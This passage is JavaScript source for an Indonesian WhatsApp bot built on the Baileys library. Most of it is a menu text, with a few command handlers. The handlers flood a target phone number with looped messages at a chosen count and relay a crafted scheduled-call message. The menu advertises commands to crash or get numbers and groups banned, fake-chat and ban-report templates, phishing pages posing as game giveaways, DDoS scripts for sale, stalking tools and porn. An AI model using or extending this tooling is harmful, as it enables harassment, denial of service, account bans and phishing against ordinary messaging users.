々 ${prefix}🐉 62xx|ᴊᴜᴍʟᴀʜ
々 ${prefix}🌵 62xx|ᴊᴜᴍʟᴀʜ
々 ${prefix}🎄 62xx|ᴊᴜᴍʟᴀʜ
々 ${prefix}🌲 62xx|ᴊᴜᴍʟᴀʜ
々 ${prefix}🌳 62xx|ᴊᴜᴍʟᴀʜ
々 ${prefix}🌱 62xx|ᴊᴜᴍʟᴀʜ
々 ${prefix}😈 62xx|ᴊᴜᴍʟᴀʜ
々 ${prefix}🗿 62xx|ᴊᴜᴍʟᴀʜ
└ ◦ ${prefix}😎 62xx|ᴊᴜᴍʟᴀʜ

𖣂 *B U G - E M O J I - N U M B E R ッ*

┌ ◦ ${prefix}😱 62xxxx
々 ${prefix}🤣 62xxxx
々 ${prefix}😂 62xxxx
々 ${prefix}😘 62xxxx
々 ${prefix}😜 62xxxx
└ ◦ ${prefix}👊 62xxxx

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦`
Biiofc.sendMessage(m.chat, {
      video: {url: "https://telegra.ph/file/5d1add8542f4ed8fe5a74.mp4"},
      gifPlayback: true,
      caption: text12,
      contextInfo: {
      externalAdReply: {
      title: '𝚂 𝙷 𝙸 𝙽 𝚉 𝚄  - 𝙼 𝙳',
      body: 'Whatsapp',
      thumbnailUrl: 'https://telegra.ph/file/a3ac2f00daa729da99a33.jpg',
          sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
      mediaType: 1,
      renderLargerThumbnail: true
      }}}, {quoted: m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio4.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break
case '😱': case '🤣': case '😂': case '😘': case '😜': case '👊': {
if (!isOwner && !isPremium) return m.reply('*khusus Premium*')
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
jumlah = `${encodeURI(text)}`
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(from, {text: `Kkk?`}, {quoted:hzkkk})
}
}
m.reply(`ᴅᴏɴᴇ ʙᴏsᴋᴜᴜ.`)
break
case 'puh1': {
if (!isOwner) return m.reply("ngapain?") 
 var call = {
 scheduledCallCreationMessage: {
 callType: 2,
 scheduledTimestampMs:  Date.now(),
 title: `${buttonkal}`
 }
}
haikal.relayMessage(m.chat, call, {})
}
break
        case 'unlitet' : case '🌷' : case '🐲': case '🐉': case '🌵': case '🎄': case '🌲': case '🌳': case '🌱': case '😎': case '😈': case '🗿':  {
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`ᴍᴀsᴜᴋᴀɴ ɴᴏᴍᴏʀ ʏᴀɴɢ ᴠᴀʟɪᴅ ᴍᴀsʙʀᴏ.`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: 'DONE!!!'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: 'DONE!!!'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: 'DONE!!!!'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000) 
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
}
Biiofc.sendMessage(from, { text: `ᴅᴏɴᴇ ʙᴏsᴋᴜᴜ`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb HardzSenpaii.`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@HardzBanxv", 
"sourceUrl": "https://youtube.com/@HardzBanxv" }}}, { quoted: m })
}
break
case "allmenu": {
const version = require("baileys/package.json").version
const text12 = `
*ʜᴀɪ ᴋᴀᴋ @${sender.split("@")[0]} 👋*

𖣂 *I N F O - B O T*

*ᴏᴡɴᴇʀ ɴᴀᴍᴇ* : *ʜᴀʀᴅᴢ sᴇɴᴘᴀɪɪ*
*ʙᴏᴛ ɴᴀᴍᴇ* : *sʜɪɴᴢᴜᴜ ᴍᴅ*
*ᴛʏᴘᴇ* : *ᴄᴀsᴇ*
*ᴠᴇʀꜱɪᴏɴ* : *9*
*ʙᴀɪʟᴇyꜱ* : *@ᴀᴅɪᴡᴀsʜɪɴɢ/ʙᴀɪʟᴇʏs*

𖣂 *O W N E R - M E N U ッ*

┌ ◦${prefix}ᴀᴅᴅᴏᴡɴᴇʀ
々 ${prefix}ᴅᴇʟᴏᴡɴᴇʀ
々 ${prefix}ᴀᴅᴅᴘʀᴇᴍ
々 ${prefix}ᴅᴇʟᴘʀᴇᴍ
々 ${prefix}sᴇʟғ
々 ${prefix}ᴘᴜʙʟɪᴄ
々 ${prefix}ʟᴇᴀᴠᴇ
々 ${prefix}ᴊᴏɪɴ *ʟɪɴᴋ*
々 ${prefix}ᴄᴇᴋɪᴘ
々 ${prefix}sʜᴜᴛᴅᴏᴡɴ
々 ${prefix}ɢᴇᴛᴄᴀsᴇ
々 ${prefix}ɢᴇᴛғɪʟᴇ
└ ◦${prefix}ᴇɴᴄ

𖣂 *B U G - E M O J I - M E N U ッ*

┌ ◦${prefix}🌷 62xx|ᴊᴜᴍʟᴀʜ
々 ${prefix}🐲 62xx|ᴊᴜᴍʟᴀʜ
々 ${prefix}🐉 62xx|ᴊᴜᴍʟᴀʜ
々 ${prefix}🌵 62xx|ᴊᴜᴍʟᴀʜ
々 ${prefix}🎄 62xx|ᴊᴜᴍʟᴀʜ
々 ${prefix}🌲 62xx|ᴊᴜᴍʟᴀʜ
々 ${prefix}🌳 62xx|ᴊᴜᴍʟᴀʜ
々 ${prefix}🌱 62xx|ᴊᴜᴍʟᴀʜ
々 ${prefix}😈 62xx|ᴊᴜᴍʟᴀʜ
々 ${prefix}🗿 62xx|ᴊᴜᴍʟᴀʜ
└ ◦${prefix}😎 62xx|ᴊᴜᴍʟᴀʜ

𖣂 *A N I M E - M E N U ッ*

々 ${prefix}ᴀɴɪᴍᴇsᴘᴀɴᴋ
々 ${prefix}ᴡᴀʟʟᴘᴀᴘᴇʀᴀɴɪᴍᴇ
々 ${prefix}ᴛʜᴀɪʟᴀɴᴅ
々 ${prefix}ʟᴏʟɪ
々 ${prefix}ᴄᴏsᴘʟᴀʏ
々 ${prefix}ᴄᴇᴄᴀɴ
々 ${prefix}ᴄᴏɢᴀɴ
々 ${prefix}ᴄʜɪɴᴀ
々 ${prefix}ɪɴᴅᴏɴᴇsɪᴀ
々 ${prefix}ᴋᴏʀᴇᴀ
々 ${prefix}ᴍᴀʟᴀʏsɪᴀ
々 ${prefix}ᴠɪᴇᴛɴᴀᴍ

𖣂 *L I S T - B U G - M E N U ッ*

々 ${prefix}ʙᴜɢɴᴜᴍʙᴇʀ
々 ${prefix}ʙᴜɢɢʀᴏᴜᴘ
々 ${prefix}ʙᴀɴɴᴇᴅᴍᴇɴᴜ
々 ${prefix}ᴜɴʙᴀɴᴍᴇɴᴜ
々 ${prefix}ʙᴜɢᴇᴍᴏᴊɪ
々 ${prefix}ʀᴇᴘᴏʀᴛʙᴜɢ

𖣂 *B O K E P - M E N U ッ*

々 ${prefix}xɴxxsᴇᴀʀᴄʜ
々 ${prefix}xɴxxᴅʟ
々 ${prefix}ᴘᴘᴛᴛ

𖣂 *N E W - M E N U ッ*

々 ${prefix}ᴄᴜᴀᴄᴀ
々 ${prefix}sᴛᴀʟᴋᴛɪᴋᴛᴏᴋ
々 ${prefix}ᴄᴏᴜᴘʟᴇ
々 ${prefix}sᴛᴀʟᴋɪɢ
々 ${prefix}ɪɴғᴏɢᴇᴍᴘᴀ
々 ${prefix}ᴋᴀᴛᴀᴀɴɪᴍᴇ
々 ${prefix}ᴄᴇʀᴘᴇɴ
々 ${prefix}ɴᴘᴍsᴛᴀʟᴋ
々 ${prefix}ᴍʏɪᴘ
々 ${prefix}ᴍᴇᴅɪᴀғɪʀᴇ
々 ${prefix}ɢᴏᴏɢʟᴇ
々 ${prefix}ʏᴛsᴇᴀʀᴄʜ
々 ${prefix}ssᴡᴇʙ
々 ${prefix}ᴛᴏᴜʀʟ
々 ${prefix}ᴛᴏᴍᴘ4
々 ${prefix}ᴛᴏɪᴍɢ
々 ${prefix}ᴛᴏɢɪғ
々 ${prefix}ᴛᴏᴠɴ
々 ${prefix}sᴍᴇᴍᴇ
々 ${prefix}ᴛᴏᴀᴜᴅ

𖣂 *G R O U P - M E N U ッ*

々 ${prefix}ᴏᴡɴᴇʀ
々 ${prefix}ǫᴄ
々 ${prefix}ᴛᴛs
々 ${prefix}sᴛɪᴄᴋᴇʀ
々 ${prefix}ʟɪɴᴋɢʀᴏᴜᴘ
々 ${prefix}ʜɪᴅᴇᴛᴀɢ
々 ${prefix}sᴇᴛᴘᴘʙᴏᴛ
々 ${prefix}sᴇᴛᴘᴘɢʀᴏᴜᴘ
々 ${prefix}ᴅᴇʟᴘᴘɢᴄ
々 ${prefix}ᴀᴅᴅ
々 ${prefix}ᴋɪᴄᴋ
々 ${prefix}ᴘʀᴏᴍᴏᴛᴇ
々 ${prefix}ᴅᴇᴍᴏᴛᴇ
々 ${prefix}ᴘʀᴏᴍᴏᴛᴇᴀʟʟ
々 ${prefix}ᴅᴇᴍᴏᴛᴇᴀʟʟ
々 ${prefix}ᴀɴᴛɪʟɪɴᴋ
々 ${prefix}ᴍᴜᴛᴇɢᴄ

𖣂 *P U S H K O N - M E N U ッ*

々 ${prefix}ᴄᴇᴋɪᴅɢᴄ
々 ${prefix}ʟɪsᴛɢʀᴏᴜᴘ
々 ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋᴠ1 *ɪᴅɢᴄ|ᴛᴇxᴛ*
々 ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋᴠ2 *ᴛᴇxᴛ*
々 ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋᴠ3 *ɪᴅɢʀᴏᴜ|ᴊᴇᴅᴀ|ᴛᴇxᴛ*
々 ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋᴠ4 *ᴊᴇᴅᴀ|ᴛᴇxᴛ*
々 ${prefix}sᴀᴠsᴄᴏɴᴛᴀᴄᴛv1 *ɪᴅɢʀᴏᴜᴘ*
々 ${prefix}sᴀᴠᴇᴄᴏɴᴛᴀᴄᴛᴠ2 *ᴛᴇxᴛ*
々 ${prefix}sᴀᴠᴇᴋᴏɴᴛᴀᴋ *ᴛᴇxᴛ*
々 ${prefix}ɢᴇᴛᴄᴏɴᴛᴀᴄᴛ *ᴛᴇxᴛ*
々 ${prefix}sᴇɴᴅᴋᴏɴᴛᴀᴋ *ᴛᴇxᴛ*
々 ${prefix}ʙᴄᴠɪᴅᴇᴏ *ᴛᴇxᴛ*
々 ${prefix}ʙᴄɢᴄ *ᴛᴇxᴛ*
々 ${prefix}ʙᴄᴘᴏʟʟ *ᴛᴇxᴛ*
々 ${prefix}ᴊᴘᴍ *ᴛᴇxᴛ*

𖣂 *B U G - A T T A C K M E N U ッ*

々 ${prefix}gas *nomor|jumlah*
々 ${prefix}kill *nomor|jumlah*
々 ${prefix}crash *nomor|jumlah*
々 ${prefix}shoot *nomor|jumlah*
々 ${prefix}bugkuy *nomor|jumlah*
々 ${prefix}duarr *nomor|jumlah*
々 ${prefix}killyou *nomor|jumlah*
々 ${prefix}doblekill *nomor|jumlah*
々 ${prefix}triplekill *nomor|jumlah*
々 ${prefix}savage *nomor|jumlah*
々 ${prefix}santet *nomor|jumlah*
々 ${prefix}danger *nomor|jumlah*
々 ${prefix}meninggal *nomor|jumlah*
々 ${prefix}headshot *nomor|jumlah*
々 ${prefix}mati *nomor|jumlah*

𖣂 *B U G - G R U P - M E N U ッ*

々 ${prefix}killgc *linkgc|jumlah*
々 ${prefix}santetgc *linkgc|jumlah*
々 ${prefix}gcwakwaw *linkgc|jumlah*
々 ${prefix}togc *linkgc|jumlah*
々 ${prefix}matigc *linkgc|jumlah*
々 ${prefix}kuygc *linkgc|jumlah*
々 ${prefix}attackgc *linkgc|jumlah*
々 ${prefix}mampusgc *linkgc|jumlah*
々 ${prefix}gasgc *linkgc|jumlah*
々 ${prefix}ampasgc *linkgc|jumlah*
々 ${prefix}bahayagc *linkgc|jumlah*
々 ${prefix}hatihatigc *linkgc|jumlah*
々 ${prefix}crashgc *linkgc|jumlah*
々 ${prefix}stuckgc *linkgc|jumlah*
々 ${prefix}ganasgc *linkgc|jumlah*

𖣂 *B U G - G R U P - M E N U 2 ッ*

々 ${prefix}buggc *idgroup|jumlah*
々 ${prefix}shootgc *idgroup|jumlah*
々 ${prefix}dorrgc *idgroup|jumlah*
々 ${prefix}attackgc1 *idgroup|jumlah*
々 ${prefix}meninggalgc *idgroup|jumlah*
々 ${prefix}matigc1*idgroup|jumlah*
々 ${prefix}seranggc *idgroup|jumlah*
々 ${prefix}bomgc *idgroup|jumlah*
々 ${prefix}ledakangc *idgroup|jumlah*
々 ${prefix}atomgc *idgroup|jumlah*
々 ${prefix}hancurgc *idgroup|jumlah*
々 ${prefix}bugzirgc *idgroup|jumlah*
々 ${prefix}stuckgc2 *idgroup|jumlah*
々 ${prefix}baugc *idgroup|jumlah*
々 ${prefix}ultigc *idgroup|jumlah*

𖣂 *B A N N E D - M E N U ッ*

々 ${prefix}ᴄᴀʟʟ *ɴᴏᴍᴏʀ*
々 ${prefix}ᴏᴜᴛ *ɴᴏᴍᴏʀ*
々 ${prefix}ᴠᴇʀɪғ *ɴᴏᴍᴏʀ*
々 ${prefix}ᴋᴇɴᴏɴ *ɴᴏᴍᴏʀ*
々 ${prefix}bannedv1 *ɴᴏᴍᴏʀ*
々 ${prefix}bannedv2 *ɴᴏᴍᴏʀ*
々 ${prefix}bannedv3 *ɴᴏᴍᴏʀ*
々 ${prefix}bannedv4 *ɴᴏᴍᴏʀ*
々 ${prefix}bannedv5 *ɴᴏᴍᴏʀ*
々 ${prefix}bannedv6 *ɴᴏᴍᴏʀ*

𖣂 *U N B A N N E D - M E N U ッ*

々 ${prefix}unbannedv1 *nomor*
々 ${prefix}unbannedv2 *nomor*
々 ${prefix}unbannedv3 *nomor*
々 ${prefix}unbannedv4 *nomor*
々 ${prefix}unbannedv5 *nomor*

𖣂 *J E B E H - M E N U ッ*

々 ${prefix}ғᴏʀᴍᴀᴛᴘᴏsᴛ
々 ${prefix}ғᴏʀᴍᴀᴛɴᴇᴇᴅ
々 ${prefix}ғᴇᴇʀᴇᴋʙᴇʀ
々 ${prefix}ғᴏʀᴍᴀᴛᴘᴇɴᴄᴀɪʀᴀɴ
々 ${prefix}ᴍᴄ *_ɴᴀᴍᴀ ɢᴄ_*
々 ${prefix}ᴀʟʟʀᴇᴄ
々 ${prefix}ᴅᴀɴᴀᴍᴀsᴜᴋ
々 ${prefix}ᴅᴏɴᴇʀᴇᴋʙᴇʀ
々 ${prefix}ᴅᴏɴᴇᴍᴄ *_ɪsɪ ᴍᴀɴᴜᴀʟ_*


𖣂 *S A L D O - M E N U ッ*

々 ${prefix}saldonya 
々 ${prefix}tfsaldo 
々 ${prefix}addsaldo 
々 ${prefix}minsaldo 

𖣂 *B U Y S C - M E N U ッ*

 々 ${prefix}buyscbugv1
 々 ${prefix}buyscbugv2
 々 ${prefix}buyscbugv3
 々 ${prefix}buyscv2
 々 ${prefix}buyscv3
 々 ${prefix}buyscv3subdo
 々 ${prefix}buyscv4
 々 ${prefix}buyscv5
 々 ${prefix}buyscv6
 々 ${prefix}buyscv6subdo
 々 ${prefix}buyscv7otp
 々 ${prefix}buyscv7addpm2
 々 ${prefix}buyscjagagrupv1
 々 ${prefix}buyscjagagrupv2
 々 ${prefix}buyscpushkontak
 々 ${prefix}buyschwv191
 々 ${prefix}buyschwv192
 々 ${prefix}buyschwv201
 々 ${prefix}buyschwv202
 々 ${prefix}buyscpanel
 々 ${prefix}buyscpushautosave
 々 ${prefix}buyscjpmv1
 々 ${prefix}buyscjpmv2
 々 ${prefix}buyscjpmv3
 々 ${prefix}buyscvps1
 々 ${prefix}buyscvps2
 々 ${prefix}buyscpm2
 々 ${prefix}buyscthemav1
 々 ${prefix}buyscthemav2
 々 ${prefix}buyscnowa
 々 ${prefix}buyscwebp
 々 ${prefix}buysctesmoni
 々 ${prefix}buyscddos
 々 ${prefix}buymodule
 々 ${prefix}buyscbukaenc

𖣂 *P A Y M E N T - M E N U ッ*

々 ${prefix}dana
々 ${prefix}gopay ( Sedang Proses )
々 ${prefix}orkut
々 ${prefix}qris
々 ${prefix}bri

𖣂 *S T O R E - M E N U ッ*

々 ${prefix}vps
々 ${prefix}done
々 ${prefix}done?
々 ${prefix}batal
々 ${prefix}tunda
々 ${prefix}proses
々 ${prefix}reqvps
々 ${prefix}reqpanel
々 ${prefix}addlist
々 ${prefix}dellist

𖣂 *S U N T I K - M E N U ッ*

々 ${prefix}ceksaldo-smm
々 ${prefix}smmlist
々 ${prefix}suntiksmm 
々 ${prefix}cektransaksi 

𖣂 *R A N D O M - M E N U ッ*

々 ${prefix}randomcecan1
々 ${prefix}randomcecan2
々 ${prefix}randomcecan3
々 ${prefix}randomcecan4
々 ${prefix}randomcecan5
々 ${prefix}randomcecan6
々 ${prefix}randomcecan7
々 ${prefix}randomcecan8
々 ${prefix}randomcecan9
々 ${prefix}randomcecan10

𖣂 *T I K T O K - M E N U ッ*

々 ${prefix}tiktokgirl
々 ${prefix}tiktokghea
々 ${prefix}tiktokbocil
々 ${prefix}tiktoknukhty
々 ${prefix}tiktoksantuy
々 ${prefix}tiktokkayes
々 ${prefix}tiktokpanrika
々 ${prefix}tiktoknotnot
々 ${prefix}chinese
々 ${prefix}hijab
々 ${prefix}indo
々 ${prefix}japanese
々 ${prefix}korean
々 ${prefix}malay
々 ${prefix}randomgirl
々 ${prefix}randomboy
々 ${prefix}thai
々 ${prefix}vietnamese
々 ${prefix}aesthetic
々 ${prefix}antiwork
々 ${prefix}blackpink
々 ${prefix}bike
々 ${prefix}boneka
々 ${prefix}cosplay
々 ${prefix}cat
々 ${prefix}doggo
々 ${prefix}justina
々 ${prefix}kayes
々 ${prefix}kpop
々 ${prefix}notnot

𖣂 *D O M A I N - M E N U ッ*

々 ${prefix}subdomain 
々 ${prefix}addgc
々 ${prefix}delgc

𖣂 *V P S D O - M E N U ッ*

々 ${prefix}deldroplet
々 ${prefix}svps / sendvps
々 ${prefix}sdomain / sendomain
々 ${prefix}listdroplet
々 ${prefix}cekdroplet
々 ${prefix}turnoff
々 ${prefix}turnon
々 ${prefix}sisadroplet
々 ${prefix}rebuild
々 ${prefix}restartvps
々 ${prefix}vps1g1c
々 ${prefix}vps2g1c
々 ${prefix}vps4g2c
々 ${prefix}vps8g4c
々 ${prefix}listvps1 (list harga vps linode)
々 ${prefix}listvps2 (list harga vps Digital Ocean)

𖣂 *T O P U P G A M E - M E N U ッ*

々 ${prefix}ceksaldomaupedia
々 ${prefix}list-pascabayar
々 ${prefix}list-prabayar
々 ${prefix}list-sosmed
々 ${prefix}maudeposit
々 ${prefix}topupgame
々 ${prefix}ᴄᴇᴋɢᴀᴍᴇ
々 ${prefix}ᴛᴏᴘᴜᴘ

𖣂 *T E X T W A - M E N U ッ*

 ༺ 𝗙𝗔𝗞𝗘 𝗖𝗛𝗔𝗧 ༻
 
々 ${prefix}ғᴀᴋᴇᴄ1
々 ${prefix}ғᴀᴋᴇᴄ2
々 ${prefix}ғᴀᴋᴇᴄ3
々 ${prefix}ғᴀᴋᴇᴄ4
々 ${prefix}ғᴀᴋᴇᴄ5
々 ${prefix}ғᴀᴋᴇᴄ6
々 ${prefix}ғᴀᴋᴇᴄ7
々 ${prefix}ғᴀᴋᴇᴄ8
々 ${prefix}ғᴀᴋᴇᴄ9
々 ${prefix}ғᴀᴋᴇᴄ10
々 ${prefix}ғᴀᴋᴇᴄ11
々 ${prefix}ᴀʟʟᴛᴏᴛᴀʟ

 ༺ 𝗨𝗡𝗕𝗔𝗡 𝗦𝗣𝗔𝗠  ༻
 
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ1
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ2
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ3
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ4
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ5
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ6
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ7
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ8
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ9
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ10
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ11
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ12
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ13
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ14
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ15
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ16
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ17
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ18
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ19
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ20
々 ${prefix}ᴛᴇxᴛᴜɴʙᴀɴv21

 ༺ 𝗕𝗔𝗡𝗡𝗘𝗗 ༻
 
々 ${prefix}ᴛᴇxᴛʙᴀɴᴠ1
々 ${prefix}ᴛᴇxᴛʙᴀɴᴠ2
々 ${prefix}ᴛᴇxᴛʙᴀɴᴠ3
々 ${prefix}ᴛᴇxᴛʙᴀɴᴠ4
々 ${prefix}ᴛᴇxᴛʙᴀɴᴠ5
々 ${prefix}ᴛᴇxᴛʙᴀɴᴠ6
々 ${prefix}ᴛᴇxᴛʙᴀɴᴠ7
々 ${prefix}ᴛᴇxᴛʙᴀɴᴠ8
々 ${prefix}ᴛᴇxᴛʙᴀɴᴠ9
々 ${prefix}ᴛᴇxᴛʙᴀɴᴠ10

༺ 𝗧𝗢𝗢𝗟𝗦 ༻

 々 ${prefix}ᴛᴏᴏʟs1
 々 ${prefix}ᴛᴏᴏʟs2
 
𖣂 *P A N E L - M E N U*

々 ${prefix}sᴇʀᴠᴇʀᴘᴀɴᴇʟ1

𖣂 *O T O M A T I S - M E N U ッ*

⭔●${prefix}ʙᴜʏsʀᴠ
⭔●${prefix}ʙᴜʏᴠᴘs
⭔●${prefix}ʙᴜʏsᴄ
⭔●${prefix}ʙᴜʏᴏᴡɴᴇʀ
⭔●${prefix}ʙᴜʏᴘʀᴇᴍ

𖣂 *P M 2 - M E N U ッ*

々 ${prefix}ʙᴜʏᴄᴀsᴇᴘᴍ2
々 ${prefix}ʙᴜʏᴇɢɢᴘᴍ2
々 ${prefix}ʙᴜʏᴀᴘɪᴘᴍ2
々 ${prefix}ʙᴜʏsᴄᴏᴍ2

𖣂 *S E W A B O T - M E N U ッ*

々 ${prefix}ʙᴜʏsᴇᴡᴀɪɴʙᴏᴛ
々 ${prefix}ʟɪsᴛsᴇᴡᴀ
々 ${prefix}ᴋᴏɴғɪʀsᴇᴡᴀ
々 ${prefix}ᴄᴀɴᴄᴇʟsᴇᴡᴀ
々 ${prefix}sᴇᴡᴀ
々 ${prefix}ʙᴜʏsᴇᴡᴀ
々 ${prefix}ʟɪsᴛsᴇᴡᴀ

𖣂 *B U G - E M O J I - M E N U ッ*

々 ${prefix}ᴡᴇʙᴘ1 (ᴍᴇᴅɪᴀғɪʀᴇ ᴄᴀʜʏᴏ)
々 ${prefix}ᴡᴇʙᴘ2 (ᴍᴇᴅɪᴀғɪʀᴇ ғɪʟᴇ)
々 ${prefix}ᴡᴇʙᴘ3 (ɢʀᴜᴘ ᴡᴀ +18)
々 ${prefix}ᴡᴇʙᴘ4 (ᴄᴏᴅᴀsʜᴏᴘ)
々 ${prefix}ᴡᴇʙᴘ5 (ғғ sᴘɪɴ sɢ)
々 ${prefix}ᴡᴇʙᴘ6 (ғғ ᴄʟᴀɪᴍ)
々 ${prefix}ᴡᴇʙᴘ7 (ᴘᴜʙɢᴍ12)
々 ${prefix}ᴡᴇʙᴘ8 (ᴍᴏʙɪʟᴇ ʟᴇɢᴇɴᴅ)
々 ${prefix}ᴡᴇʙᴘ9 (sɪᴍᴏɴᴛᴏᴋ ғᴜʟʟ ɪɴғᴏ)
々 ${prefix}ʙᴀʜᴀɴʏᴛ
々 ${prefix}ʙᴀʜᴀɴᴛᴡɪᴛ
